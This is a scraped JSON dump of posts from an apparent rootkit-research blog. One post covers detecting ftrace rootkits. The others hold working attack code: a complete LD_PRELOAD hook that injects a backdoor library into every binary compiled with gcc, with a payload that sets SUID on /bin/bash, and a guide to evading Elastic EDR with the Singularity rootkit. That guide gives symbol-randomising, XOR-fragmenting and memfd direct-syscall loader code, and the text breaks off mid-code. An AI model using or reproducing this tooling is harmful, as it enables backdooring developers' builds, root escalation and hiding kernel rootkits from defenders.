/\u003e\n\u003c/p\u003e\n\u003cp\u003eThis article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as \u003ccode\u003eopen()\u003c/code\u003e, \u003ccode\u003ewrite()\u003c/code\u003e, and \u003ccode\u003eclose()\u003c/code\u003e, which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\u003c/p\u003e\n\u003cp\u003eWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the \u003ccode\u003eopen()\u003c/code\u003e call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., \u003ccode\u003eio_uring_enter\u003c/code\u003e, \u003ccode\u003eio_uring_setup\u003c/code\u003e) for coordination.\u003c/p\u003e","title":"breaking ld_preload rootkit hooks"},{"content":"Hello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is Ftrace? ftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\nMain Features:\nFunction Tracing: Records kernel function calls, including order and execution time. Event Tracing: Monitors system events. Custom Filters: Focus on specific functions or events via configuration files. Support for dynamic tracers like kprobes and integration with tools like perf. On more current systems, tracing is enabled by default, but if not, simply set it:\nmount -t tracefs nodev /sys/kernel/tracing Ways to detect ftrace-based rootkits Detecting an LKM rootkit that uses ftrace is actually easier than you might think. If a rootkit uses ftrace, it is automatically detectable, because currently (at the time I am writing this post) there is no rootkit that I have seen that can hide from some tracing features.\nI will use the dreaded KoviD rootkit that uses ftrace as hooking.\nNow with KoviD loaded and hidden, we can begin.\nKoviD can be easily detected in /sys/kernel/tracing/enabled_functions, this file basically lists the kernel functions currently enabled for tracing.\nKoviD can also be detected in /sys/kernel/tracing/touched_functions, this file shows all functions that were every traced by ftrace or a direct trampoline (only for kernel 6.4+)\nin the current version of kovid, its functions do not appear in /sys/kernel/tracing/available_filter_functions, but it still leaves traces in this file, which basically lists kernel functions that can be filtered for tracing.\nNo ftrace based rootkit that I have seen so far can hide 100% and can be easily found, they always leave some trace behind.\nYou can also check my github repository, it contains several really cool things to detect and remove modern rootkits.\nCheat sheet: Detecting and Removing Linux Kernel Rootkit ","permalink":"http://localhost:1313/hacking/ftrace-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ftrace\"\u003eWhat is Ftrace?\u003c/h2\u003e\n\u003cp\u003eftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\u003c/p\u003e\n\u003cp\u003eMain Features:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFunction Tracing: Records kernel function calls, including order and execution time.\u003c/li\u003e\n\u003cli\u003eEvent Tracing: Monitors system events.\u003c/li\u003e\n\u003cli\u003eCustom Filters: Focus on specific functions or events via configuration files.\u003c/li\u003e\n\u003cli\u003eSupport for dynamic tracers like kprobes and integration with tools like perf.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOn more current systems, tracing is enabled by default, but if not, simply set it:\u003c/p\u003e","title":"Detecting rootkits based on ftrace hooking."},{"content":"Hijacking GCC with LD_PRELOAD Introduction If you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries without touching the source code, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during linking.\nIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\nThis is a simple project, with simple ideas and mechanisms, and it can certainly be improved.\nElfDoor-gcc repo: https://github.com/MatheuZSecurity/ElfDoor-gcc\nUnderstanding the Compilation Process with GCC Before attacking the compilation process, it\u0026rsquo;s essential to understand how it works\nGCC functions as more than a basic compiler; it operates as a kind of pipeline manager for multiple internal tools, depending on the requirements:\ngcc main.c -o main\nThis command has a sequence of steps:\nPreprocessing (cpp)\nExpands macros, includes header files, and removes comments.\nGenerates a .i file containing the \u0026ldquo;expanded\u0026rdquo; source code.\nCompilation (cc1)\nConverts the .i code into assembly.\nPerforms syntax and semantic checks, along with optimizations.\nAssembly (as)\nTranslates the assembly code into an object file (.o). Linkagem (collect2 → ld)\nCombines object files, resolves symbols, and produces the final binary.\ngcc invokes collect2, which in turn calls ld, the actual linker.\nThis final stage linking, is where the hijacking occurs. If we manage to intercept the moment when ld is invoked, we can modify its arguments and inject our own malicious library\nAttack Chain The core concept is to leverage LD_PRELOAD to override critical functions like execve and posix_spawn, enabling us to intercept process execution.\nOur project will consist of:\nmain.c: Hooks execve and posix_spawn, inspects the arguments, and, if appropriate, injects parameters to include our malicious library.\nb.a: The library containing the malicious code we want to embed in the final binary\nInstall.sh: Compiles and loads our malicious LD_PRELOAD.\nhello.c: A simple program that just prints \u0026ldquo;Hello,\u0026rdquo; but after compiling and executing, it will run our malicious code.\nElfDoor Hooks The main.c file is responsible for hooking process execution functions, such as execve and posix_spawn, to inject a malicious static library called b.a into the binary compilation process. This technique allows any binary generated on a compromised machine to carry a \u0026ldquo;hidden\u0026rdquo; payload without the developer noticing.\nThe structure starts with the inclusion of the essential libraries:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;spawn.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; extern char **environ; The use of _GNU_SOURCE is essential to enable GNU libc specific extensions, such as the interception of execve and posix_spawn. Including \u0026lt;dlfcn.h\u0026gt; allows the use of dlsym, which is crucial for obtaining pointers to the original functions and diverting execution.\nNext, we have auxiliary functions responsible for determining if the running binary is relevant. For example, is_gcc detects whether the binary being executed is the GCC, cc, or clang compiler:\nint is_gcc(const char *path) { const char *progname = strrchr(path, \u0026#39;/\u0026#39;); progname = progname ? progname + 1 : path; return strcmp(progname, \u0026#34;gcc\u0026#34;) == 0 || strcmp(progname, \u0026#34;cc\u0026#34;) == 0 || strcmp(progname, \u0026#34;clang\u0026#34;) == 0; } The code above extracts the program name from the full path (e.g., /usr/bin/gcc) and directly compares it with known compiler names. The same pattern is used to identify collect2 and ld in the is_collect2 and is_linker functions.\nThen, the should_inject function determines whether the injection should occur, based on the compiler arguments:\nint should_inject(char *const argv[]) { for (int i = 0; argv[i]; ++i) { if (strcmp(argv[i], \u0026#34;-c\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-E\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-S\u0026#34;) == 0) return 0; } return 1; } These flags (-c, -E, -S) are used in intermediate compilation processes that do not generate final executables. Since the goal is to inject code into the final binary, these modes are ignored.\nThe most important function is inject_args, which constructs a new argument list by inserting the static library:\nchar **inject_args(const char *bin_path, char *const argv[], int extra) { int argc; for (argc = 0; argv[argc]; ++argc); const char *lib_path = \u0026#34;/dev/shm/b.a\u0026#34;; for (int i = 0; i \u0026lt; argc; ++i) { if (argv[i] \u0026amp;\u0026amp; strstr(argv[i], \u0026#34;b.a\u0026#34;) != NULL) { return NULL; } } const char **new_argv = malloc(sizeof(char *) * (argc + extra + 1)); if (!new_argv) return NULL; int i = 0, j = 0; for (; i \u0026lt; argc; ++i) new_argv[j++] = argv[i]; const char *arg1, *arg2, *arg3; if (is_gcc(bin_path)) { arg1 = \u0026#34;-Wl,--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;-Wl,--no-whole-archive\u0026#34;; } else { arg1 = \u0026#34;--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;--no-whole-archive\u0026#34;; } new_argv[j++] = arg1; new_argv[j++] = arg2; new_argv[j++] = arg3; new_argv[j] = NULL; return (char **)new_argv; } The inject_args function modifies a program\u0026rsquo;s argument list by conditionally adding a static library (/dev/shm/b.a), depending on the binary, and prevents duplication of this library in the list.\nThe hooking of execve happens as follows:\nint execve(const char *pathname, char *const argv[], char *const envp[]) { static int (*real_execve)(const char *, char *const [], char *const []) = NULL; if (!real_execve) real_execve = dlsym(RTLD_NEXT, \u0026#34;execve\u0026#34;); if ((is_gcc(pathname) || is_collect2(pathname) || is_linker(pathname)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(pathname, argv, 3); if (new_argv) { int result = real_execve(pathname, new_argv, envp); free(new_argv); return result; } } return real_execve(pathname, argv, envp); } When the process attempts to execute gcc, ld, or similar, the execve hook intercepts the call. It calls the inject_args function to modify the arguments, and if the modification is successful, it executes the binary with the new argument list. The original execve function is called via the pointer obtained with dlsym, ensuring that the actual call still happens, but with the malicious code included.\nFinally, the posix_spawn function is handled with identical logic:\nint posix_spawn(pid_t *pid, const char *path, const posix_spawn_file_actions_t *file_actions, const posix_spawnattr_t *attrp, char *const argv[], char *const envp[]) { static int (*real_posix_spawn)(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char *const [], char *const []) = NULL; if (!real_posix_spawn) real_posix_spawn = dlsym(RTLD_NEXT, \u0026#34;posix_spawn\u0026#34;); if ((is_gcc(path) || is_collect2(path) || is_linker(path)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(path, argv, 3); if (new_argv) { int result = real_posix_spawn(pid, path, file_actions, attrp, new_argv, envp); free(new_argv); return result; } } return real_posix_spawn(pid, path, file_actions, attrp, argv, envp); } This hook ensures that even when gcc or ld use posix_spawn internally, the malicious library will still be injected. It is a layer of compatibility that makes the our malware even more effective.\nThe entire mechanism is activated when the library compiled with this main.c is loaded via LD_PRELOAD, a legitimate Linux feature used to replace functions from standard libraries. Any compilation performed on the system can be automatically compromised.\nMalicious code: b.c The purpose of the b.c code is to modify the permissions of /bin/bash to allow it to be executed with elevated privileges.\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; __attribute__((constructor)) void backdoor() { chmod(\u0026#34;/bin/bash\u0026#34;, 04755); } In other words, as soon as some code is compiled using GCC, for example, it will inject our backdoor inside, and if executed as root, it will set the SUID on /bin/bash.\nPOC Conclusion With this simple hook, we’re able to intercept GCC’s compilation pipeline and inject a malicious library during the linking stage, all without modifying the source code.\nThe result is a seemingly legitimate binary that silently carries a hidden payload, ready to be executed.\nPlease feel free to contact me on Twitter if you have any questions.\nRootkit Researchers\n","permalink":"http://localhost:1313/hacking/gcc/","summary":"\u003ch1 id=\"hijacking-gcc-with-ld_preload\"\u003eHijacking GCC with LD_PRELOAD\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/MmPbrjL.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIf you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries \u003cstrong\u003ewithout touching the source code\u003c/strong\u003e, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during \u003cstrong\u003elinking\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\u003c/p\u003e","title":"ElfDoor-gcc"},{"content":" Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nIntroduction Security solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\nThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\nTable of Contents Introduction Understanding the Threat Landscape: Elastic YARA Rules Primary Detection Rules Detection Signature Analysis The Singularity Rootkit: Capabilities Overview Core Features Evasion Technique 1: Symbol Name Randomization The Problem The Solution: Intelligent Name Randomization Evasion Technique 2: Module Fragmentation The Problem The Solution: Fragment + XOR Encoding + In-Memory Loading Custom Loader via memfd_create Evasion Technique 3: Ftrace Helper Obfuscation The Problem The Solution: Rename Ftrace Framework Functions Build Pipeline: Automated Obfuscation Workflow Final Test: Successful Evasion Bonus: Compilation Path Detection Bypass Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells Conclusion Understanding the Threat Landscape: Elastic YARA Rules In a default environment with the Elastic agent installed, attempting to compile and load the Singularity rootkit results in immediate detection and files removed. The kernel object is automatically deleted and isolated in quarantine before it can be loaded into the kernel.\nThere were approximately 26 detections.\nUpon investigation, I identified the specific Elastic YARA rules detecting our rootkit:\nPrimary Detection Rules Linux_Rootkit_BrokePKG.yar\nLinux_Rootkit_Generic.yar\nLinux_Rootkit_Generic_61229bdf - Detects common rootkit patterns and function names Linux_Rootkit_Generic_482bca48 - Targets suspicious prefixes and hook patterns Linux_Rootkit_Generic_d0c5cfe0 - Detects initialization and hooking combinations Linux_Rootkit_Generic_f07bcabe - Identifies ftrace helper functions Linux_Rootkit_Generic_5d17781b - Targets license strings combined with kallsyms Linux_Rootkit_BrokePKG_7b7d4581 - Specific patterns from known rootkits Detection Signature Analysis Generic Rootkit Detection (61229bdf) Targets: hide_module, hook_getdents, orig_kill, fake_tcp4_seq_show, etc. Condition: 4 or more matching strings Total patterns: 57 distinct function names Hook Pattern Detection (482bca48) System strings: sys_call_table, kallsyms_lookup_name, kprobe Rootkit prefixes: rootkit, hide_, hacked_, fake_, hooked_ Hook suffixes: _getdents, _kill, _tcp4_seq_show, _udp4_seq_show Condition: 3 system strings AND (all prefixes OR 3 prefixes + 5 hooks) License String Detection (5d17781b) Targets: kallsyms_lookup_name_t + \u0026#34;license=GPL\u0026#34; Condition: Both strings must be present Purpose: Detects ftrace-based rootkits using kallsyms Ftrace Helper Detection (f07bcabe) Targets: - fh_install_hook - fh_remove_hook - fh_resolve_hook_address Condition: 2 or more matching strings BrokePKG Specific Detection (7b7d4581) License strings: - author=R3tr074 - name=brokepkg - description=Rootkit - license=GPL Specific strings: - brokepkg - brokepkg: module revealed - br0k3_n0w_h1dd3n Hook patterns: - nf_inet_hooks - ftrace_hook - hook_getdents - hook_kill - orig_tcp4_seq_show Condition: 3 license strings OR 2 specific strings OR 4 hook patterns Since our rootkit utilizes ftrace for syscall hooking, it naturally contains many of these patterns. The challenge becomes: how do we maintain functionality while evading static signature detection?\nThe Singularity Rootkit: Capabilities Overview Source: https://github.com/MatheuZSecurity/Singularity\nBefore diving into evasion techniques, let\u0026rsquo;s understand what the Singularity rootkit accomplishes:\nCore Features Process Hiding: Hides processes from /proc. File and Directory Hiding: Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.) Network Hiding: Hides TCP connections on port 8081 from netstat and packet capture tools Privilege Escalation: Provides root access via signal 59 (kill -59 ) or environment variable (MAGIC=mtz) ICMP Backdoor: Triggers reverse shell via magic ICMP packets (sequence 1337) Anti-Analysis Features:\nBlocks BPF programs and tracing Prevents ftrace manipulation by other users Disables module loading via init_module/finit_module hooks Filters /proc/kallsyms, /proc/modules, and tracefs Taint Clearing: Resets kernel taint flags to hide unsigned module loading Log Sanitization: Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit Module Stealth: Self-hiding from lsmod and /sys/module directory Evasion Technique 1: Symbol Name Randomization The Problem Rootkits typically use predictable naming patterns that become signatures:\nhook_getdents64 fake_tcp4_seq_show hide_module orig_kill hacked_open hooked_read Elastic\u0026rsquo;s YARA rules (61229bdf, 482bca48, d0c5cfe0) specifically target these prefixes:\n$rk1 = \u0026#34;rootkit\u0026#34; $rk2 = \u0026#34;hide_\u0026#34; $rk3 = \u0026#34;hacked_\u0026#34; $rk4 = \u0026#34;fake_\u0026#34; $rk5 = \u0026#34;hooked_\u0026#34; $hook1 = \u0026#34;_getdents\u0026#34; $hook2 = \u0026#34;_kill\u0026#34; $hook3 = \u0026#34;_tcp4_seq_show\u0026#34; The Solution: Intelligent Name Randomization Our Python obfuscator generates kernel-like generic names that blend in with legitimate kernel code:\ndef _generate_random_name(self) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Generates random name that avoids YARA patterns\u0026#34;\u0026#34;\u0026#34; # Avoid suspicious prefixes: hook_, fake_, hide_, hacked_, hooked_, orig_ # Use generic names that look legitimate prefixes = [\u0026#39;sys\u0026#39;, \u0026#39;kern\u0026#39;, \u0026#39;dev\u0026#39;, \u0026#39;mm\u0026#39;, \u0026#39;fs\u0026#39;, \u0026#39;net\u0026#39;, \u0026#39;proc\u0026#39;, \u0026#39;sched\u0026#39;] suffixes = [\u0026#39;handler\u0026#39;, \u0026#39;helper\u0026#39;, \u0026#39;worker\u0026#39;, \u0026#39;ops\u0026#39;, \u0026#39;func\u0026#39;, \u0026#39;entry\u0026#39;, \u0026#39;cb\u0026#39;] prefix = random.choice(prefixes) suffix = random.choice(suffixes) middle = \u0026#39;\u0026#39;.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) return f\u0026#34;{prefix}_{middle}_{suffix}\u0026#34; Key Features No suspicious prefixes (hook_, fake_, hide_) Looks like legitimate kernel code Maintains internal consistency via mapping file Protects kernel API calls from renaming Protected Names The obfuscator maintains a whitelist of kernel API functions that must NOT be renamed:\ndef _get_protected_names(self) -\u0026gt; Set[str]: \u0026#34;\u0026#34;\u0026#34;Names from kernel that should NOT be changed\u0026#34;\u0026#34;\u0026#34; return { # Basic C types \u0026#39;int\u0026#39;, \u0026#39;void\u0026#39;, \u0026#39;long\u0026#39;, \u0026#39;char\u0026#39;, \u0026#39;size_t\u0026#39;, \u0026#39;ssize_t\u0026#39;, # Essentials \u0026#39;module_init\u0026#39;, \u0026#39;module_exit\u0026#39;, \u0026#39;THIS_MODULE\u0026#39;, \u0026#39;current\u0026#39;, \u0026#39;kmalloc\u0026#39;, \u0026#39;kfree\u0026#39;, \u0026#39;printk\u0026#39;, \u0026#39;pr_debug\u0026#39;, \u0026#39;copy_from_user\u0026#39;, \u0026#39;copy_to_user\u0026#39;, \u0026#39;fget\u0026#39;, \u0026#39;fput\u0026#39;, \u0026#39;kernel_read\u0026#39;, # Structures \u0026#39;pt_regs\u0026#39;, \u0026#39;file\u0026#39;, \u0026#39;task_struct\u0026#39;, \u0026#39;sk_buff\u0026#39;, # Entry points \u0026#39;main\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;exit\u0026#39;, } Function Name Extraction The obfuscator scans source files for function definitions using multiple regex patterns:\nself.function_patterns = [ r\u0026#39;\\bnotrace\\s+(?:static\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+(?:notrace\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+asmlinkage\\s+\\w+\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\basmlinkage\\s+\\w+\\s+\\*?\\(?\\*?(\\w+)\\)?\u0026#39;, r\u0026#39;\\b(\\w+_init)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\b(\\w+_exit)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\bHOOK\\s*\\([^,]+,\\s*(\\w+)\\s*,\u0026#39;, r\u0026#39;\\btypedef\\s+[^;]+\\s+(\\w+_t)\\s*;\u0026#39;, ] Example Transformation Before:\n// modules/hiding_directory.c static notrace long hook_getdents64(const struct pt_regs *regs) { long res = orig_getdents64(regs); // ... } static notrace long hook_getdents(const struct pt_regs *regs) { long res = orig_getdents(regs); // ... } After:\n// obfuscated/modules/hiding_directory.c static notrace long sys_abjker_handler(const struct pt_regs *regs) { long res = kern_wopqls_helper(regs); // ... } static notrace long fs_tnmqlk_ops(const struct pt_regs *regs) { long res = net_xzpnrm_func(regs); // ... } Implementation Details def _replace_in_content(self, content: str, mapping: Dict[str, str]) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Replace names in content\u0026#34;\u0026#34;\u0026#34; modified = content # Sort by descending length to avoid partial substitutions sorted_items = sorted(mapping.items(), key=lambda x: len(x[0]), reverse=True) for old_name, new_name in sorted_items: # Use word boundary for exact substitution pattern = r\u0026#39;\\b\u0026#39; + re.escape(old_name) + r\u0026#39;\\b\u0026#39; modified = re.sub(pattern, new_name, modified) return modified The key insight: we sort by length descending to prevent partial matches. For example, if we have both hook_kill and hook_kill_ex, we must replace hook_kill_ex first to avoid breaking it into sys_abc_handler_ex.\nEvasion Technique 2: Module Fragmentation The Problem EDR solutions scan loaded kernel modules primarily on disk. A monolithic .ko file presents a single attack surface that\u0026rsquo;s easy to analyze:\nSignature scanning of the entire module on disk Static analysis of ELF structure Symbol table enumeration String pattern detection (including \u0026ldquo;GPL\u0026rdquo;, \u0026ldquo;kallsyms_lookup_name\u0026rdquo;, etc.) The Solution: Fragment + XOR Encoding + Ephemeral In-Memory Loading We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static disk-based analysis while maintaining functionality.\nHow This Evades Detection The evasion works through a multi-layered approach:\nDisk-Based YARA Evasion: XOR encoding breaks string signatures in stored fragments Ephemeral Reconstruction: The complete module exists in plaintext only briefly in a temporary memfd Self-Hiding Post-Load: The rootkit immediately conceals itself after loading Important Technical Note: After XOR decoding during the load process, strings like \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo; are restored to plaintext in memory. However, Elastic\u0026rsquo;s YARA rules primarily scan files on disk, not ephemeral memory structures. The combination of:\nXOR-encoded fragments on disk (unreadable to YARA) Millisecond-duration plaintext in anonymous memfd (difficult to scan) Immediate self-hiding after module load (invisible to subsequent analysis) \u0026hellip;creates an effective evasion without requiring permanent string obfuscation in memory.\nFragmentation Pipeline: def fragment(self, chunk_size: int = 65536, encode: bool = True) -\u0026gt; List[bytes]: \u0026#34;\u0026#34;\u0026#34; Fragment the .ko into chunks Args: chunk_size: Size of each fragment (default: 64KB) encode: If True, apply XOR encoding Returns: List of fragments \u0026#34;\u0026#34;\u0026#34; print(f\u0026#34;\\n[*] Fragmenting: {self.ko_path}\u0026#34;) print(f\u0026#34; Chunk size: {chunk_size} bytes\u0026#34;) # Read the .ko file with open(self.ko_path, \u0026#39;rb\u0026#39;) as f: ko_data = f.read() original_size = len(ko_data) print(f\u0026#34;[+] Original size: {original_size} bytes\u0026#34;) # Generate random XOR key xor_key = os.urandom(16) if encode else b\u0026#39;\\x00\u0026#39; * 16 # Fragment fragments = [] num_chunks = (original_size + chunk_size - 1) // chunk_size for i in range(num_chunks): start = i * chunk_size end = min(start + chunk_size, original_size) chunk = ko_data[start:end] # Apply encoding if necessary if encode: chunk = self._xor_encode(chunk, xor_key) fragments.append(chunk) checksum = self._calculate_checksum(chunk) print(f\u0026#34;[+] Fragment {i+1}/{num_chunks}: {len(chunk)} bytes (SHA256: {checksum[:16]}...)\u0026#34;) self.fragments = fragments # Metadata self.metadata = { \u0026#39;original_filename\u0026#39;: self.ko_path.name, \u0026#39;original_size\u0026#39;: original_size, \u0026#39;num_fragments\u0026#39;: len(fragments), \u0026#39;chunk_size\u0026#39;: chunk_size, \u0026#39;encoded\u0026#39;: encode, \u0026#39;xor_key\u0026#39;: xor_key.hex() if encode else None, \u0026#39;checksums\u0026#39;: [self._calculate_checksum(f) for f in fragments] } return fragments XOR Encoding We use a simple but effective XOR cipher with a random 16-byte key:\ndef _xor_encode(self, data: bytes, key: bytes) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Simple XOR encoding for obfuscation\u0026#34;\u0026#34;\u0026#34; encoded = bytearray() key_len = len(key) for i, byte in enumerate(data): encoded.append(byte ^ key[i % key_len]) return bytes(encoded) While XOR is cryptographically weak, it serves our purpose for disk-based evasion:\nBreaks signature matching in files stored on disk Fast to encode/decode Minimal overhead Easy to implement in C loader Evasion Layer Breakdown ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 1: Fragments on Disk (XOR Encoded) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: YARA cannot detect signatures │ │ Reason: All bytes are XOR\u0026#39;ed, \u0026#34;GPL\u0026#34; appears as random bytes │ │ │ │ # Before encoding │ │ strings singularity.ko | grep \u0026#34;GPL\u0026#34; │ │ license=GPL │ │ │ │ # After encoding │ │ strings fragments/chunk_000.bin | grep \u0026#34;GPL\u0026#34; │ │ (no results - bytes are obfuscated) │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 2: Ephemeral memfd (Plaintext - Milliseconds) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings are restored to plaintext │ │ Reason: XOR decode happens during reconstruction │ │ │ │ Timeline: │ │ T+0ms: memfd created │ │ T+5ms: fragments decoded and written │ │ T+10ms: finit_module() called │ │ T+15ms: memfd closed and deleted │ │ │ │ Detection Window: ~15 milliseconds │ │ Elastic Challenge: Must scan anonymous memfd in real-time │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 3: Loaded Module (Plaintext but Hidden) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings exist in kernel memory │ │ Reason: Module is loaded normally │ │ │ │ Rootkit Self-Hiding: │ │ ✓ Hidden from lsmod │ │ ✓ Hidden from /sys/module │ │ ✓ Filters /proc/kallsyms │ │ ✓ Filters /proc/modules │ │ ✓ Blocks BPF and tracing │ │ │ │ Result: Invisible to analysis tools │ └─────────────────────────────────────────────────────────────────┘ Why Elastic Doesn\u0026rsquo;t Detect This YARA primarily scans disk files\nFragments are XOR\u0026rsquo;ed and broken up No single file contains the complete signature pattern Original .ko is deleted after fragmentation memfd is ephemeral and anonymous\nExists for ~15 milliseconds during loading No persistent path in filesystem Difficult to scan in real-time Post-load self-hiding\nModule immediately conceals itself Blocks subsequent inspection attempts Filtering prevents memory analysis Resulting Structure fragments/ ├── chunk_000.bin # XOR-encoded fragment (64KB) ├── chunk_001.bin # XOR-encoded fragment (64KB) ├── chunk_002.bin # XOR-encoded fragment (64KB) ├── ... ├── chunk_N.bin # Final fragment (variable size) ├── metadata.json # Contains XOR key and checksums └── reconstruct.sh # Automated reconstruction script Metadata Format { \u0026#34;original_filename\u0026#34;: \u0026#34;singularity.ko\u0026#34;, \u0026#34;original_size\u0026#34;: 245632, \u0026#34;num_fragments\u0026#34;: 4, \u0026#34;chunk_size\u0026#34;: 65536, \u0026#34;encoded\u0026#34;: true, \u0026#34;xor_key\u0026#34;: \u0026#34;a3f5b2c8e1d4f7a6b9c2e5f8a1d4b7c0\u0026#34;, \u0026#34;checksums\u0026#34;: [ \u0026#34;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\u0026#34;, \u0026#34;cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce\u0026#34;, \u0026#34;2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae\u0026#34;, \u0026#34;fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9\u0026#34; ] } Custom Loader via memfd_create Instead of using insmod or modprobe, we implement a custom loader that:\nReads encrypted fragments from disk Decodes them in memory Creates an anonymous memory file descriptor Writes the reconstructed module to the memory FD Loads the module via direct syscall Immediately closes the memfd (auto-deleted) Loader Architecture /* * Singularity Loader * * 1. Uses 32-bit syscall (finit_module) via inline assembly * 2. Reconstructs .ko from fragments in memory * 3. Decodes XOR encoding (strings restored to plaintext) * 4. Uses memfd_create for ephemeral loading * 5. Direct syscall to avoid libc wrapper * 6. memfd exists only during loading (~15ms) * * Compile: gcc -o loader loader.c -static * Usage: ./loader fragments/ */ #define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; // Syscall numbers #define __NR_finit_module 313 #define __NR_memfd_create 319 // Settings #define MAX_FRAGMENTS 256 #define MAX_CHUNK_SIZE (1024 * 1024) // 1MB #define XOR_KEY_SIZE 16 #define MODULE_FLAGS 0 Direct Syscall Implementation To avoid EDR hooking of libc functions, we use inline assembly for direct syscalls:\n// Direct 64-bit syscall static inline long syscall_direct_64(long number, long arg1, long arg2, long arg3) { long ret; register long r10 asm(\u0026#34;r10\u0026#34;) = arg3; asm volatile( \u0026#34;syscall\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;D\u0026#34; (arg1), \u0026#34;S\u0026#34; (arg2), \u0026#34;d\u0026#34; (r10) : \u0026#34;rcx\u0026#34;, \u0026#34;r11\u0026#34;, \u0026#34;memory\u0026#34; ); return ret; 